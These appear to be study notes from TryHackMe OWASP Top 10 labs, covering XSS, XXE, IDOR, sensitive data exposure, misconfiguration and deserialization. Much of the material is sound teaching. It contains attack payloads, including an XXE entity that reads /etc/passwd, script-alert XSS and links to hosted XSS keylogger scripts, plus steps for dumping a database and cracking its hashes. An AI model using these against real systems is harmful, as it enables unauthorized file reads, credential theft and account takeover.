<p>Comments on a blog</p>
<p>User profile information</p>
<p>Website Listings</p>
<p>Sometimes developers think limiting input values on the client-side is good enough protection, so changing values to something the web application wouldn't be expecting is a good source of discovering stored XSS, for example, an age field that is expecting an integer from a dropdown menu, but instead, you manually send the request rather than using the form allowing you to try malicious payloads.&nbsp;</p>
<p>Once you've found some data which is being stored in the web application,&nbsp; you'll then need to confirm that you can successfully run your JavaScript payload; your payload will be dependent on where in the application your code is reflected.</p>
<p>&nbsp;</p>
<h4>DOM&nbsp; Based XSS</h4>
<p>What is the DOM?<br><br>&nbsp;</p>
<p>DOM stands for&nbsp;Document&nbsp;Object&nbsp;Model and is a programming interface for HTML and XML documents. It represents the page so that programs can change the document structure, style and content. A web page is a document, and this document can be either displayed in the browser window or as the HTML source.&nbsp;A diagram of the HTML DOM is displayed below:</p>
<figure class="image"><img src="file:///C:/Users/morsmanr/AppData/Local/Packages/oice_16_974fa576_32c1d314_2861/AC/Temp/msohtmlclip1/01/clip_image091.png"></figure>
<p>If you want to learn more about the DOM and gain a deeper understanding&nbsp;<a href="https://www.w3.org/TR/REC-DOM-Level-1/introduction.html">w3.org</a>&nbsp;have a great resource.</p>
<p>Exploiting the DOM</p>
<p>DOM Based XSS is where the JavaScript execution happens directly in the browser without any new pages being loaded or data submitted to backend code. Execution occurs when the website JavaScript code acts on input or user interaction.<br><br>Example Scenario:<br><br>The website's JavaScript gets the contents from the&nbsp;<code>window.location.hash</code>&nbsp;parameter and then writes that onto the page in the currently being viewed section. The contents of the hash aren't checked for malicious code, allowing an attacker to inject JavaScript of their choosing onto the webpage.<br><br>Potential Impact:<br>Crafted links could be sent to potential victims, redirecting them to another website or steal content from the page or the user's session.</p>
<p><strong>How to test for Dom Based XSS:</strong></p>
<p>&nbsp;</p>
<p>DOM Based XSS can be challenging to test for and requires a certain amount of knowledge of JavaScript to read the source code. You'd need to look for parts of the code that access certain variables that an attacker can have control over, such as "<strong>window.location.x</strong>" parameters.</p>
<p>&nbsp;</p>
<p>When you've found those bits of code, you'd then need to see how they are handled and whether the values are ever written to the web page's DOM or passed to unsafe JavaScript methods such as&nbsp;eval().</p>
<p>&nbsp;</p>
<h4>Blind XSS</h4>
<p>Blind XSS is similar to a stored XSS (which we covered in task 4) in that your payload gets stored on the website for another user to view, but in this instance, you can't see the payload working or be able to test it against yourself first.<br><br><strong>Example Scenario:</strong><br><br>A website has a contact form where you can message a member of staff. The message content doesn't get checked for any malicious code, which allows the attacker to enter anything they wish. These messages then get turned into support tickets which staff view on a private web portal.<br><br><strong>Potential Impact:</strong><br><br>Using the correct payload, the attacker's JavaScript could make calls back to an attacker's website, revealing the staff portal URL, the staff member's cookies, and even the contents of the portal page that is being viewed. Now the attacker could potentially hijack the staff member's session and have access to the private portal.</p>
<p><strong>How to test for Blind XSS:</strong></p>
<p>&nbsp;</p>
<p>When testing for Blind XSS vulnerabilities, you need to ensure your payload has a call back (usually an&nbsp;HTTP&nbsp;request). This way, you know if and when your code is being executed.</p>
<p>&nbsp;</p>
<p>A popular tool for Blind XSS attacks is&nbsp;<a href="https://xsshunter.com/">xsshunter</a>. Although it's possible to make your own tool in JavaScript, this tool will automatically capture cookies, URLs, page contents and more.</p>
<p>&nbsp;</p>
<h2>Sensitive data disclosure (2)</h2>
<p>When a webapp accidentally divulges sensitive data, we refer to it as "Sensitive Data Exposure". This is often data directly linked to customers (e.g. names, dates-of-birth, financial information, etc), but could also be more technical information, such as usernames and passwords. At more complex levels this often involves techniques such as a "Man in The Middle Attack", whereby the attacker would force user connections through a device which they control, then take advantage of weak encryption on any transmitted data to gain access to the intercepted information (if the data is even encrypted in the first place...). Of course, many examples are much simpler, and vulnerabilities can be found in web apps which can be exploited without any advanced networking knowledge. Indeed, in some cases, the sensitive data can be found directly on the webserver itself...</p>
<p>&nbsp;</p>
<p>The most common way to store a large amount of data in a format that is easily accessible from many locations at once is in a database. This is obviously perfect for something like a web application, as there may be many users interacting with the website at any one time. Database engines usually follow the&nbsp;<strong>S</strong>tructured&nbsp;<strong>Q</strong>uery&nbsp;<strong>L</strong>anguage (SQL) syntax; however, alternative formats (such as NoSQL) are rising in popularity.</p>
<p>In a production environment it is common to see databases set up on dedicated servers, running a database service such as MySQL or MariaDB; however, databases can also be stored as files. These databases are referred to as "flat-file" databases, as they are stored as a single file on the computer. This is much easier than setting up a full database server, and so could potentially be seen in smaller web applications. Accessing a database server is outwith the scope of today's task, so let's focus instead on flat-file databases.</p>
<p>As mentioned previously, flat-file databases are stored as a file on the disk of a computer. Usually this would not be a problem for a webapp, but what happens if the database is stored underneath the root directory of the website (i.e. one of the files that a user connecting to the website is able to access)? Well, we can download it and query it on our own machine, with full access to everything in the database. Sensitive Data Exposure indeed!</p>
<p>That is a big hint for the challenge, so let's briefly cover some of the syntax we would use to query a flat-file database.</p>
<p>The most common (and simplest) format of flat-file database is an&nbsp;<i>sqlite</i>&nbsp;database. These can be interacted with in most programming languages, and have a dedicated client for querying them on the command line. This client is called "<i>sqlite3</i>", and is installed by default on Kali.</p>
<p>Let's suppose we have successfully managed to download a database:</p>
<figure class="image"><img src="file:///C:/Users/morsmanr/AppData/Local/Packages/oice_16_974fa576_32c1d314_2861/AC/Temp/msohtmlclip1/01/clip_image092.png" alt="Afbeelding met tekst

Automatisch gegenereerde beschrijving"></figure>
<p>We can see that there is an SQlite database in the current folder.</p>
<p>To access it we use:&nbsp;sqlite3 &lt;database-name&gt;:</p>
<figure class="image"><img src="file:///C:/Users/morsmanr/AppData/Local/Packages/oice_16_974fa576_32c1d314_2861/AC/Temp/msohtmlclip1/01/clip_image094.png" alt="Afbeelding met tekst

Automatisch gegenereerde beschrijving"></figure>
<p>From here we can see the tables in the database by using the&nbsp;.tables&nbsp;command:</p>
<figure class="image"><img src="file:///C:/Users/morsmanr/AppData/Local/Packages/oice_16_974fa576_32c1d314_2861/AC/Temp/msohtmlclip1/01/clip_image096.png" alt="Afbeelding met tekst

Automatisch gegenereerde beschrijving"></figure>
<p>At this point we can dump all of the data from the table, but we won't necessarily know what each column means unless we look at the table information. First let's use&nbsp;PRAGMA table_info(customers);&nbsp;to see the table information, then we'll use&nbsp;SELECT * FROM customers;&nbsp;to dump the information from the table:</p>
<figure class="image"><img src="file:///C:/Users/morsmanr/AppData/Local/Packages/oice_16_974fa576_32c1d314_2861/AC/Temp/msohtmlclip1/01/clip_image098.png" alt="Afbeelding met tekst

Automatisch gegenereerde beschrijving"></figure>
<p>We can see from the table information that there are four columns: custID, custName, creditCard and password. You may notice that this matches up with the results. Take the first row:</p>
<p>0|Joy Paulson|4916 9012 2231 7905|5f4dcc3b5aa765d61d8327deb882cf99<br>&nbsp;</p>
<p>We have the custID (0), the custName (Joy Paulson), the creditCard (4916 9012 2231 7905) and a password hash (5f4dcc3b5aa765d61d8327deb882cf99).</p>
<p>&nbsp;</p>
<p>When it comes to hash cracking, Kali comes pre-installed with various tools -- if you know how to use these then feel free to do so; however, they are outwith the scope of this material.</p>
<p>Instead we will be using the online tool:&nbsp;<a href="https://crackstation.net/">Crackstation</a>. This website is extremely good at cracking weak password hashes. For more complicated hashes we would need more sophisticated tools; however, all of the crackable password hashes used in today's challenge are weak MD5 hashes, which Crackstation should handle very nicely indeed.</p>
<p>When we navigate to the website we are met with the following interface:</p>
<figure class="image"><img src="file:///C:/Users/morsmanr/AppData/Local/Packages/oice_16_974fa576_32c1d314_2861/AC/Temp/msohtmlclip1/01/clip_image100.png"></figure>
<p>Let's try pasting in the password hash for Joy Paulson which we found in the previous task (<code>5f4dcc3b5aa765d61d8327deb882cf99</code>). We solve the Captcha, then click the "Crack Hashes" button:</p>
<figure class="image"><img src="file:///C:/Users/morsmanr/AppData/Local/Packages/oice_16_974fa576_32c1d314_2861/AC/Temp/msohtmlclip1/01/clip_image102.png" alt="Afbeelding met tekst

Automatisch gegenereerde beschrijving"></figure>
<p>We see that the hash was successfully broken, and that the user's password was "password" -- how secure!</p>
<p>It's worth noting that Crackstation works using a massive wordlist. If the password is not in the wordlist then Crackstation will not be able to break the hash.</p>
<p>&nbsp;</p>
<h2>XEE: XML External Entity</h2>
<figure class="image"><img src="file:///C:/Users/morsmanr/AppData/Local/Packages/oice_16_974fa576_32c1d314_2861/AC/Temp/msohtmlclip1/01/clip_image103.png"></figure>
<p>(Credits to acunetix.com for the image)</p>
<p>An&nbsp;XML&nbsp;External Entity (XXE) attack is a vulnerability that abuses features of XML parsers/data. It often allows an attacker to interact with any backend or external systems that the application itself can access and can allow the attacker to read the file on that system. They can also cause Denial of Service (DoS) attack or could use XXE to perform Server-Side Request Forgery (SSRF) inducing the web application to make requests to other applications. XXE may even enable port scanning and lead to remote code execution.<br><br>There are two types of XXE attacks: in-band and out-of-band (OOB-XXE).<br>1) An in-band XXE attack is the one in which the attacker can receive an immediate response to the XXE payload.</p>
<p>2) out-of-band XXE attacks (also called blind XXE), there is no immediate response from the web application and attacker has to reflect the output of their XXE payload to some other file or their own server.</p>
<p>&nbsp;</p>
<p><strong>What is XML?</strong><br><br>XML&nbsp;(eXtensible Markup Language) is a markup language that defines a set of rules for encoding documents in a format that is both human-readable and machine-readable. It is a markup language used for storing and transporting data.&nbsp;<br><br><strong>Why we use XML?</strong><br><br>1.&nbsp;XML&nbsp;is platform-independent and programming language independent, thus it can be used on any system and supports the technology change when that happens.<br><br>2. The data stored and transported using&nbsp;XML&nbsp;can be changed at any point in time without affecting the data presentation.<br><br>3.&nbsp;XML&nbsp;allows validation using DTD and Schema. This validation ensures that the XML document is free from any syntax error.<br><br>4.&nbsp;XML&nbsp;simplifies data sharing between various systems because of its platform-independent nature. XML data doesnt require any conversion when transferred between different systems.<br><br><strong>Syntax</strong><br><br>Every&nbsp;XML&nbsp;document mostly starts with what is known as XML Prolog.<br><br>&lt;?xml version="1.0" encoding="UTF-8"?&gt;</p>
<p><br>Above the line is called&nbsp;XML&nbsp;prolog and it specifies the XML version and the encoding used in the XML document. This line is not compulsory to use but it is considered a `good practice` to put that line in all your XML documents.<br><br>Every&nbsp;XML&nbsp;document must contain a `ROOT` element. For example:</p>
<p>&lt;?xml version="1.0" encoding="UTF-8"?&gt;<br>&lt;mail&gt;<br>&nbsp;&nbsp; &lt;to&gt;falcon&lt;/to&gt;<br>&nbsp;&nbsp; &lt;from&gt;feast&lt;/from&gt;<br>&nbsp;&nbsp; &lt;subject&gt;About XXE&lt;/subject&gt;<br>&nbsp;&nbsp; &lt;text&gt;Teach about XXE&lt;/text&gt;<br>&lt;/mail&gt;</p>
<p><br>In the above example the&nbsp;&lt;mail&gt;&nbsp;is the ROOT element of that document and&nbsp;&lt;to&gt;,&nbsp;&lt;from&gt;,&nbsp;&lt;subject&gt;,&nbsp;&lt;text&gt;&nbsp;are the children elements. If the&nbsp;XML&nbsp;document doesn't have any root element then it would be consideredwrong&nbsp;or&nbsp;invalid&nbsp;XML doc.<br><br>Another thing to remember is that&nbsp;XML&nbsp;is a case sensitive language. If a tag starts like&nbsp;&lt;to&gt;&nbsp;then it has to end by&nbsp;&lt;/to&gt;&nbsp;and not by something like&nbsp;&lt;/To&gt;(notice the capitalization of&nbsp;T)<br><br>Like HTML we can use attributes in&nbsp;XML&nbsp;too. The syntax for having attributes is also very similar to HTML. For example:<br>&lt;text category = "message"&gt;You need to learn about XXE&lt;/text&gt;</p>
<p>In the above example&nbsp;category&nbsp;is the attribute name and&nbsp;message&nbsp;is the attribute value.</p>
<p>&nbsp;</p>
<p>Before we move on to start learning about XXE we'll have to understand what is DTD in&nbsp;XML.</p>
<p>DTD stands for Document Type Definition. A DTD defines the structure and the legal elements and attributes of an&nbsp;XML&nbsp;document.</p>
<p>Let us try to understand this with the help of an example. Say we have a file named&nbsp;note.dtd&nbsp;with the following content:</p>
<p>&lt;!DOCTYPE note [ &lt;!ELEMENT note (to,from,heading,body)&gt; &lt;!ELEMENT to (#PCDATA)&gt; &lt;!ELEMENT from (#PCDATA)&gt; &lt;!ELEMENT heading (#PCDATA)&gt; &lt;!ELEMENT body (#PCDATA)&gt; ]&gt;</p>
<p>Now we can use this DTD to validate the information of some&nbsp;XML&nbsp;document and make sure that the XML file conforms to the rules of that DTD.</p>
<p>Ex: Below is given an&nbsp;XML&nbsp;document that uses&nbsp;note.dtd</p>
<p>&lt;?xml&nbsp;version="1.0"&nbsp;encoding="UTF-8"?&gt;<br>&lt;!DOCTYPE&nbsp;note SYSTEM "note.dtd"&gt;<br>&lt;note&gt;<br>&nbsp;&nbsp;&nbsp; &lt;to&gt;falcon&lt;/to&gt;<br>&nbsp;&nbsp;&nbsp; &lt;from&gt;feast&lt;/from&gt;<br>&nbsp;&nbsp;&nbsp; &lt;heading&gt;hacking&lt;/heading&gt;<br>&nbsp;&nbsp;&nbsp; &lt;body&gt;XXE attack&lt;/body&gt;<br>&lt;/note&gt;</p>
<p>&nbsp;</p>
<p>So now let's understand how that DTD validates the&nbsp;XML. Here's what all those terms used in&nbsp;note.dtd&nbsp;mean</p>
<p>!DOCTYPE note -&nbsp; Defines a root element of the document named&nbsp;<strong>note</strong></p>
<p>!ELEMENT note - Defines that the note element must contain the elements: "to, from, heading, body"</p>
<p>!ELEMENT to - Defines the&nbsp;to&nbsp;element to be of type "#PCDATA"</p>
<p>!ELEMENT from - Defines the&nbsp;from&nbsp;element to be of type "#PCDATA"</p>
<p>!ELEMENT heading&nbsp; - Defines the&nbsp;heading&nbsp;element to be of type "#PCDATA"</p>
<p>!ELEMENT body - Defines the body&nbsp;element&nbsp;to be of type "#PCDATA"</p>
<p>&nbsp;&nbsp;&nbsp; <strong>NOTE</strong>: #PCDATA means parseable character data.</p>
<p>&nbsp;</p>
<p>Now we'll see some XXE payload and see how they are working.<br><br>1) The first payload we'll see is very simple. If you've read the previous task properly then you'll understand this payload very easily.<br><br><code>&lt;!DOCTYPE replace [&lt;!ENTITY name "feast"&gt; ]&gt;</code><br><code>&nbsp;&lt;userInfo&gt;</code><br><code>&nbsp; &lt;firstName&gt;falcon&lt;/firstName&gt;</code><br><code>&nbsp; &lt;lastName&gt;&amp;name;&lt;/lastName&gt;</code><br><code>&nbsp;&lt;/userInfo&gt;</code><br><br>&nbsp;</p>
<p><br>As we can see we are defining a&nbsp;<code>ENTITY</code>&nbsp;called&nbsp;<code>name</code>&nbsp;and assigning it a value&nbsp;<code>feast</code>. Later we are using that ENTITY in our code.</p>
<p>2) We can also use XXE to read some file from the system by defining an ENTITY and having it use the SYSTEM keyword<br><br><code>&lt;?xml version="1.0"?&gt;</code><br><code>&lt;!DOCTYPE root [&lt;!ENTITY read SYSTEM 'file:///etc/passwd'&gt;]&gt;</code><br><code>&lt;root&gt;&amp;read;&lt;/root&gt;</code><br><br>Here again, we are defining an ENTITY with the name&nbsp;<code>read</code>&nbsp;but the difference is that we are setting it value to `SYSTEM` and path of the file.<br><br>If we use this payload then a website vulnerable to XXE(normally) would display the content of the file&nbsp;<code>/etc/passwd</code>.</p>
<p>In a similar manner, we can use this kind of payload to read other files but a lot of times you can fail to read files in this manner or the reason for failure could be the file you are trying to read.</p>
<p>Now let us see some payloads in action. The payload that I'll be using is the one we saw in the previous task.</p>
<p>&nbsp;</p>
<p>1) Let's see how the website would look if we'll try to use the payload for displaying the name.</p>
<p>&nbsp;</p>
<figure class="image"><img src="file:///C:/Users/morsmanr/AppData/Local/Packages/oice_16_974fa576_32c1d314_2861/AC/Temp/msohtmlclip1/01/clip_image105.jpg" alt="Afbeelding met tekst

Automatisch gegenereerde beschrijving"></figure>
<p>&nbsp;</p>
<p>On the left side, we can see the burp request that was sent with the URL encoded payload and on the right side we can see that the payload was able to successfully display name&nbsp;falcon feast</p>
<p>&nbsp;</p>
<p>2) Now let's try to read the&nbsp;/etc/passwd</p>
<p>&nbsp;</p>
<figure class="image"><img src="file:///C:/Users/morsmanr/AppData/Local/Packages/oice_16_974fa576_32c1d314_2861/AC/Temp/msohtmlclip1/01/clip_image107.jpg" alt="Afbeelding met tekst

Automatisch gegenereerde beschrijving"></figure>
<p>&nbsp;</p>
<h3><br><br>&nbsp;</h3>
<h2>Broken Access Control and IDOR<br><br>&nbsp;</h2>
<p>Websites have pages that are protected from regular visitors, for example only the site's admin user should be able to access a page to manage other users. If a website visitor is able to access the protected page/pages that they are not authorised to view, the access controls are broken.</p>
<p>&nbsp;</p>
<p>A regular visitor being able to access protected pages, can lead to the following:</p>
<p>Being able to view sensitive information</p>
<p>Accessing unauthorized functionality</p>
<p>OWASP have a listed a few attack scenarios demonstrating access control weaknesses:</p>
<p><br><br>&nbsp;</p>
<p><strong>Scenario #1:</strong>&nbsp;The application uses unverified data in a SQL call that is accessing account information:</p>
<p>pstmt.setString(1, request.getParameter("acct"));</p>
<p>ResultSet results = pstmt.executeQuery( );</p>
<p>&nbsp;</p>
<p>An attacker simply modifies the acct parameter in the browser to send whatever account number they want. If not properly verified, the attacker can access any users account.</p>
<p>http://example.com/app/accountInfo?acct=notmyacct</p>
<p>&nbsp;</p>
<p><strong>Scenario #2:</strong>&nbsp;An attacker simply force browses to target URLs. Admin rights are required for access to the admin page.</p>
<p>http://example.com/app/getappInfo</p>
<p>http://example.com/app/admin_getappInfo</p>
<p>&nbsp;</p>
<p>If an unauthenticated user can access either page, its a flaw. If a non-admin can access the admin page, this is a flaw (<a href="https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_A5-Broken_Access_Control">reference to scenarios</a>).</p>
<p>&nbsp;</p>
<p>To put simply, broken access control allows attackers to bypass authorization which can allow them to view sensitive data or perform tasks as if they were a privileged user.</p>
<p>&nbsp;</p>
<figure class="image"><img src="file:///C:/Users/morsmanr/AppData/Local/Packages/oice_16_974fa576_32c1d314_2861/AC/Temp/msohtmlclip1/01/clip_image109.png" alt="Afbeelding met tekst

Automatisch gegenereerde beschrijving"></figure>
<p>IDOR, or Insecure Direct Object Reference, is the act of exploiting a misconfiguration in the way user input is handled, to access resources you wouldn't ordinarily be able to access. IDOR is a type of access control vulnerability.</p>
<p>For example, let's say we're logging into our bank account, and after correctly authenticating ourselves, we get taken to a URL like this&nbsp;<a href="https://example.com/bank?account_number=1234">https://example.com/bank?account_number=1234</a>. On that page we can see all our important bank details, and a user would do whatever they needed to do and move along their way thinking nothing is wrong.</p>
<p>There is however a potentially huge problem here, a hacker may be able to change the account_number parameter to something else like 1235, and if the site is incorrectly configured, then he would have access to someone else's bank information.</p>
<p>&nbsp;</p>
<h3>Where are IDORs located</h3>
<p>The vulnerable endpoint you're targeting may not always be something you see in the address bar. It could be content your browser loads in via an AJAX request or something that you find referenced in a JavaScript file.&nbsp;</p>
<p>&nbsp;</p>
<h3>An example</h3>
<p>The&nbsp;<strong>Your Account</strong>&nbsp;section gives you the ability to change your information such as username, email address and password. You'll notice the username and email fields pre-filled in with your information.&nbsp;&nbsp;</p>
<p>&nbsp;</p>
<p>We'll start by investigating how this information gets pre-filled. If you open your browser developer tools, select the network tab and then refresh the page, you'll see a call to an endpoint with the path /api/v1/customer?id=<code>{user_id}</code>.</p>
<p>&nbsp;</p>
<p>This page returns in JSON format your user id, username and email address. We can see from the path that the user information shown is taken from the query string's id parameter (see below image).<br><br>&nbsp;</p>
<figure class="image"><img src="file:///C:/Users/morsmanr/AppData/Local/Packages/oice_16_974fa576_32c1d314_2861/AC/Temp/msohtmlclip1/01/clip_image111.png" alt="Afbeelding met tekst, schermafbeelding, weg

Automatisch gegenereerde beschrijving"></figure>
<p><br><br>&nbsp;</p>
<p>You can try testing this id parameter for an IDOR vulnerability by changing the id to another user's id. Try selecting users with IDs 1 and 3 and then answer the questions below.</p>
<p>&nbsp;</p>
<p>Sometimes endpoints could have an unreferenced parameter that may have been of some use during development and got pushed to production. For example, you may notice a call to&nbsp;<strong>/user/details</strong>&nbsp;displaying your user information (authenticated through your session). But through an attack known as parameter mining, you discover a parameter called&nbsp;<strong>user_id</strong>&nbsp;that you can use to display other users' information, for example,<strong>&nbsp;/user/details?user_id=123</strong>.</p>
<p>&nbsp;</p>
<h3>Finding IDORs in encoded IDs</h3>
<p>When passing data from page to page either by post data, query strings, or cookies, web developers will often first take the raw data and encode it. Encoding ensures that the receiving web server will be able to understand the contents. Encoding changes binary data into an ASCII string commonly using the&nbsp;<code>a-z, A-Z, 0-9 and =</code>character for padding. The most common encoding technique on the web is base64 encoding and can usually be pretty easy to spot. You can use websites like&nbsp;<a href="https://www.base64decode.org/">https://www.base64decode.org/</a>&nbsp;to decode the string, then edit the data and re-encode it again using&nbsp;<a href="https://www.base64encode.org/">https://www.base64encode.org/</a>&nbsp;and then resubmit the web request to see if there is a change in the response.<br><br>See the image below as a graphical example of this process:</p>
<figure class="image"><img src="file:///C:/Users/morsmanr/AppData/Local/Packages/oice_16_974fa576_32c1d314_2861/AC/Temp/msohtmlclip1/01/clip_image113.jpg"></figure>
<p>&nbsp;</p>
<h3>IDORs in hashed IDs</h3>
<p>Hashed IDs are a little bit more complicated to deal with than encoded ones, but they may follow a predictable pattern, such as being the hashed version of the integer value. For example, the Id number 123 would become 202cb962ac59075b964b07152d234b70 if md5 hashing were in use.</p>
<p>&nbsp;</p>
<p>It's worthwhile putting any discovered hashes through a web service such as&nbsp;<a href="https://crackstation.net/">https://crackstation.net/</a>&nbsp;(which has a database of billions of hash to value results) to see if we can find any matches.</p>
<p>&nbsp;</p>
<h3>IDORs in unpredictable IDs</h3>
<p>If the Id cannot be detected using the above methods, an excellent method of IDOR detection is to create two accounts and swap the Id numbers between them. If you can view the other users' content using their Id number while still being logged in with a different account (or not logged in at all), you've found a valid IDOR vulnerability.</p>
<p>&nbsp;</p>
<h2>Security misconfiguration</h2>
<p>Security Misconfigurations are distinct from the other Top 10 vulnerabilities, because they occur when security could have been configured properly but was not.</p>
<p>Security misconfigurations include:</p>
<p>Poorly configured permissions on cloud services, like S3 buckets</p>
<p>Having unnecessary features enabled, like services, pages, accounts or privileges</p>
<p>Default accounts with unchanged passwords</p>
<p>Error messages that are overly detailed and allow an attacker to find out more about the system</p>
<p>Not using&nbsp;<a href="https://owasp.org/www-project-secure-headers/">HTTP security headers</a>, or revealing too much detail in the Server:&nbsp;HTTP&nbsp;header</p>
<p>This vulnerability can often lead to more vulnerabilities, such as default credentials giving you access to sensitive data, XXE or command injection on admin pages.</p>
<p>For more info, I recommend having a look at the&nbsp;<a href="https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_A6-Security_Misconfiguration">OWASP top 10 entry for Security Misconfiguration</a></p>
<p>Default Passwords</p>
<p>Specifically, this&nbsp;VM&nbsp;focusses on default passwords. These are a specific example of a security misconfiguration. You could, and should, change any default passwords but people often don't.</p>
<p>It's particularly common in embedded and Internet of Things devices, and much of the time the owners don't change these passwords.</p>
<p>It's easy to imagine the risk of default credentials from an attacker's point of view. Being able to gain access to admin dashboards, services designed for system administrators or manufacturers, or even network infrastructure could be incredibly useful in attacking a business. From data exposure to easy RCE, the effects of default credentials can be severe.</p>
<p>In October 2016, Dyn (a&nbsp;DNS&nbsp;provider) was taken offline by one of the most memorable DDoS attacks of the past 10 years. The flood of traffic came mostly from Internet of Things and networking devices like routers and modems, infected by the Mirai malware.</p>
<p>How did the malware take over the systems? Default passwords. The malware had a list of 63 username/password pairs, and attempted to log in to exposed telnet services.</p>
<p>The&nbsp;DDoS&nbsp;attack was notable because it took many large websites and services offline. Amazon, Twitter, Netflix, GitHub, Xbox Live, PlayStation Network, and many more services went offline for several hours in 3 waves of DDoS attacks on Dyn.</p>
<p>&nbsp;</p>
<h2>Cross-site scripting</h2>
<p>Cross-site scripting, also known as XSS is a security vulnerability typically found in web applications. Its a type of injection which can allow an attacker to execute malicious scripts and have it execute on a victims machine.</p>
<p>&nbsp;</p>
<p>A web application is vulnerable to XSS if it uses unsanitized user input. XSS is possible in Javascript, VBScript, Flash and CSS. There are three main types of cross-site scripting:</p>
<p><strong>Stored XSS</strong>&nbsp;- the most dangerous type of XSS. This is where a malicious string originates from the websites database. This often happens when a website allows user input that is not sanitised (remove the "bad parts" of a users input) when inserted into the database.</p>
<p><strong>Reflected XSS</strong>&nbsp;- the malicious payload is part of the victims request to the website. The website includes this payload in response back to the user. To summarise, an attacker needs to trick a victim into clicking a URL to execute their malicious payload.</p>
<p><strong>DOM-Based XSS</strong>&nbsp;- DOM stands for Document Object Model and is a programming interface for HTML and&nbsp;XML&nbsp;documents. It represents the page so that programs can change the document structure, style and content. A web page is a document and this document can be either displayed in the browser window or as the HTML source.</p>
<p>For more XSS explanations and exercises, check out the&nbsp;<a href="https://tryhackme.com/room/xss">XSS room</a>.</p>
<p>&nbsp;</p>
<p>XSS Payloads</p>
<p>Remember, cross-site scripting is a vulnerability that can be exploited to execute malicious Javascript on a victims machine. Check out some common payloads types used:</p>
<p>Popup's (&lt;script&gt;alert(Hello World)&lt;/script&gt;) - Creates a Hello World message popup on a users browser.</p>
<p>Writing HTML (document.write) - Override the website's HTML to add your own (essentially defacing the entire page).</p>
<p>XSS Keylogger (http://www.xss-payloads.com/payloads/scripts/simplekeylogger.js.html) - You can log all keystrokes of a user, capturing their password and other sensitive information they type into the webpage.</p>
<p>Port scanning (http://www.xss-payloads.com/payloads/scripts/portscanapi.js.html) - A mini local port scanner (more information on this is covered in the TryHackMe XSS room).</p>
<p>XSS-Payloads.com (http://www.xss-payloads.com/) is a website that has XSS related Payloads, Tools, Documentation and more. You can download XSS payloads that take snapshots from a webcam or even get a more capable port and network scanner.</p>
<p>&nbsp;</p>
<h2>Insecure deserialization</h2>
<p>"Insecure Deserialization is a vulnerability which occurs when untrusted data is used to abuse the logic of an application" (Acunetix., 2017)<br><br>&nbsp;</p>
<p>This definition is still quite broad to say the least. Simply, insecure deserialization is replacing data processed by an application with malicious code; allowing anything from&nbsp;DoS&nbsp;(Denial of Service) to RCE (Remote Code Execution) that the attacker can use to gain a foothold in a pentesting scenario.</p>
<p>Specifically, this malicious code leverages the legitimate serialization and deserialization process used by web applications. We'll be explaining this process and why it is so commonplace in modern web applications.</p>
<p><br>OWASP rank this vulnerability as 8 out of 10 because of the following reasons:</p>
<p>&nbsp;</p>
<p>- Low exploitability. This vulnerability is often a case-by-case basis - there is no reliable tool/framework for it. Because of its nature, attackers need to have a good understanding of the inner-workings of the ToE.</p>
<p>- The exploit is only as dangerous as the attacker's skill permits, more so, the value of the data that is exposed. For example, someone who can only cause a&nbsp;DoS&nbsp;will make the application unavailable. The business impact of this will vary on the infrastructure - some organisations will recover just fine, others, however, will not.</p>
<p><strong>What's Vulnerable?</strong></p>
<p>At summary, ultimately, any application that stores or fetches data where there are no validations or integrity checks in place for the data queried or retained. A few examples of applications of this nature are:</p>
<p>- E-Commerce Sites<br>- Forums<br>- API's<br>- Application Runtimes (Tomcat, Jenkins, Jboss, etc)</p>
<p>&nbsp;</p>
<p><strong>Objects</strong></p>
<p>A prominent element of object-oriented programming (OOP), objects are made up of two things:</p>
<p>- State</p>
<p>- Behaviour</p>
<p>&nbsp;</p>
<p>Simply, objects allow you to create similar lines of code without having to do the leg-work of writing the same lines of code again.</p>
<p>&nbsp;</p>
<p>For example, a lamp would be a good object. Lamps can have different types of bulbs, this would be their state, as well as being either on/off - their behaviour!</p>
<p>&nbsp;</p>
<p>Rather than having to accommodate every type of bulb and whether or not that specific lamp is on or off, you can use methods to simply alter the state and behaviour of the lamp.</p>
<p>&nbsp;</p>
<p style="text-align:center;"><strong>De(Serialization)</strong></p>
<p style="text-align:center;">&nbsp;</p>
<p style="text-align:center;"><i>Learning is best done through analogies</i></p>
<p style="text-align:center;">&nbsp;</p>
<p>A Tourist approaches you in the street asking for directions. They're looking for a local landmark and got lost. Unfortunately, English isn't their strong point and nor do you speak their dialect either. What do you do? You draw a map of the route to the landmark because pictures cross language barriers, they were able to find the landmark. Nice! You've just serialised some information, where the tourist then deserialised it to find the landmark.</p>
<p>&nbsp;</p>
<p>Serialisation is the process of converting objects used in programming into simpler, compatible formatting for transmitting between systems or networks for further processing or storage.</p>
<p>&nbsp;</p>
<p>Alternatively, deserialisation is the reverse of this; converting serialised information into their complex form - an object that the application will understand.</p>
<p>&nbsp;</p>
<p>What does this mean?</p>
<p>&nbsp;</p>
<p>Say you have a password of "password123" from a program that needs to be stored in a database on another system. To travel across a network this string/output needs to be converted to binary. Of course, the password needs to be stored as "password123" and not its binary notation. Once this reaches the database, it is converted or deserialised back into "password123" so it can be stored.</p>
<p><br><br>&nbsp;</p>
<p><i>The process is best explained through diagrams:</i></p>
<figure class="image"><img src="file:///C:/Users/morsmanr/AppData/Local/Packages/oice_16_974fa576_32c1d314_2861/AC/Temp/msohtmlclip1/01/clip_image114.png" alt="Afbeelding met tekst

Automatisch gegenereerde beschrijving"></figure>
<p>&nbsp;</p>
<p>How can we leverage this?</p>
<p>&nbsp;</p>
<p>Simply, insecure deserialization occurs when data from an untrusted party (I.e. a hacker) gets executed because there is no filtering or input validation; the system assumes that the data is trustworthy and will execute it no holds barred.</p>
<p>&nbsp;</p>
<p>Cookies</p>
<figure class="image"><img src="file:///C:/Users/morsmanr/AppData/Local/Packages/oice_16_974fa576_32c1d314_2861/AC/Temp/msohtmlclip1/01/clip_image116.jpg"></figure>
<p>Ah yes, the origin of many memes. Cookies are an essential tool for modern websites to function. Tiny pieces of data, these are created by a website and stored on the user's computer.&nbsp;</p>
<figure class="image"><img src="file:///C:/Users/morsmanr/AppData/Local/Packages/oice_16_974fa576_32c1d314_2861/AC/Temp/msohtmlclip1/01/clip_image118.jpg" alt="Afbeelding met tekst

Automatisch gegenereerde beschrijving"></figure>
<p>You'll see notifications like the above on most websites these days. Websites use these cookies to store user-specific behaviours like items in their shopping cart or session IDs.</p>
<p>In the web application, we're going to exploit, you'll notice cookies store login information like the below! Yikes!</p>
<p>&nbsp;</p>
